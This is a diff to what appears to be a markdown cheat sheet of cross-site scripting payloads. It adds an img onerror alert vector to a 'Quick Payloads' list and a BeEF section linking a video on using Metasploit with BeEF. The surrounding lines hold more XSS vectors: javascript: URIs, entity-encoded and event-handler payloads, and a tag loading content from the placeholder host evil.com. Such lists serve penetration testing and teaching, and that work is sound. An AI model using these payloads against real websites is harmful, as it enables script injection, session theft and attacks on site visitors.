@@ -14,6 +14,7 @@ Quick Payloads
 <iframe src="javascript:alert('Hello');“/>
 <input type=image src="&#74;avascript:alert('Have You')">
 <img src='iamnothere.gif' onError=”alert('EventHandler')">
+<img src=a onerror=alert(1)>
 <frameset onLoad="alert('EventHandler')">
 <layer name="extern" src="http://evil.com/test.html">
 ```
@@ -75,6 +76,11 @@ XSS and XML
   </html:script>
 </html:html>
 ```
+
+BeEf
+----
+
+* [Integrating Metasploit with BeEf](https://www.youtube.com/watch?v=kWvSV1u5sU8)
 
 Misc
 ----
